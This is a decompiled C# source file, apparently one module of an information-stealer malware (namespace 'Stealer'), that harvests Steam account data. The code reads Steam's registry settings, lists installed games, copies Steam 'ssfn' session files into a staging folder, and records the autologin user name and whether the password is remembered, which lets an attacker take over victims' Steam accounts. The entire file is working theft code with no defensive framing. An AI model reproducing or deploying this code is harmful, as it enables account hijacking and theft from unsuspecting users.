using System;
using System.IO;
using Microsoft.Win32;

namespace Stealer
{
	// Token: 0x0200001D RID: 29
	internal sealed class Steam
	{
		// Token: 0x06000097 RID: 151 RVA: 0x00005B70 File Offset: 0x00003D70
		public static bool GetSteamSession(string sSavePath)
		{
			bool result;
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Valve\\Steam");
				if (registryKey == null)
				{
					result = false;
				}
				else
				{
					string path = registryKey.GetValue("SteamPath").ToString();
					if (!Directory.Exists(path))
					{
						result = false;
					}
					else
					{
						Directory.CreateDirectory(sSavePath);
						foreach (string text in registryKey.OpenSubKey("Apps").GetSubKeyNames())
						{
							using (RegistryKey registryKey2 = registryKey.OpenSubKey("Apps\\" + text))
							{
								string text2 = (string)registryKey2.GetValue("Name");
								text2 = (string.IsNullOrEmpty(text2) ? "Unknown" : text2);
								string text3 = ((int)registryKey2.GetValue("Installed") == 1) ? "Yes" : "No";
								string text4 = ((int)registryKey2.GetValue("Running") == 1) ? "Yes" : "No";
								string text5 = ((int)registryKey2.GetValue("Updating") == 1) ? "Yes" : "No";
								File.AppendAllText(sSavePath + "\\Apps.txt", string.Concat(new string[]
								{
									"Application ",
									text2,
									"\n\tGameID: ",
									text,
									"\n\tInstalled: ",
									text3,
									"\n\tRunning: ",
									text4,
									"\n\tUpdating: ",
									text5,
									"\n\n"
								}));
							}
						}
						foreach (string text6 in Directory.GetFiles(path))
						{
							if (text6.Contains("ssfn"))
							{
								File.Copy(text6, sSavePath + "\\" + Path.GetFileName(text6));
							}
						}
						Counter.Steam = true;
						string str = ((int)registryKey.GetValue("RememberPassword") == 1) ? "Yes" : "No";
						string str2 = "\nAutologin User: ";
						object value = registryKey.GetValue("AutoLoginUser");
						string contents = string.Format(str2 + ((value != null) ? value.ToString() : null) + "\nRemember password: " + str, new object[0]);
						File.WriteAllText(sSavePath + "\\SteamInfo.txt", contents);
						result = true;
					}
				}
			}
			catch
			{
				result = false;
			}
			return result;
		}
	}
}
